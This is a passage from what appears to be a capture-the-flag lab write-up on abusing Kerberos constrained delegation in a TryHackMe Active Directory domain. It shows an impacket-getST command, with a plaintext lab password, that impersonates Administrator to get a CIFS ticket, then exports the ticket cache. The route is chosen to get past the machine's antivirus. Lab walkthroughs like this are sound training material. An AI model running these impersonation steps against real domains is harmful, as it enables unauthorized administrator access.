Look at the `DARLA_WINTERS` node and see that delegation is possible for the CIFS service.

![[Screenshot from 2024-08-18 13-04-37.png]]

#### DARLA_WINTERS\@THM.CORP -> AllowedToDelegate -> HAYSTACK.THM.CORP

The **AllowedToDelegate** permission allows us (in this case DARLA_WINTERS\@THM.CORP) to impersonate the **Administrator** account by targeting the CIFS service to retrieve a usable TGS ticket**.

To do this is use an `mpacket` script named `getST`.
Due to the fact the machine has AV turned on this is the easier way of do the job.

- Run on the attacking machine:

	`impacket-getST -spn cifs/haystack.thm.corp -impersonate Administrator thm.corp/DARLA_WINTERS:'Password@4444'`
	
	![[Screenshot from 2024-08-18 13-10-03.png]]
	The ticket is save in Administrator.ccache file.

- Set the variable `KRB5CCNAME` via `export KRB5CCNAME=<filename>`

	`export KRB5CCNAME=Administrator.ccache'



